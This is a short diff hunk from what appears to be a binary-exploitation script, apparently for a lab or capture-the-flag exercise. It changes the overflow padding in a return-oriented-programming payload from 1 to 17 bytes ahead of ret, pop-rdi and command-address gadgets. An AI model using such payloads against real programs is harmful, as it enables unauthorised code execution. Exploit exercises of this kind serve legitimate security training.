@@ -16,7 +16,7 @@ GRADE_EVAL = 0x401A87
 
 payload = (
     b"attack/malware\x00"
-    + b"A" * 1
+    + b"A" * 17
     + p64(RET)
     + p64(POP_RDI_RET)
     + p64(CMD_ADDR)
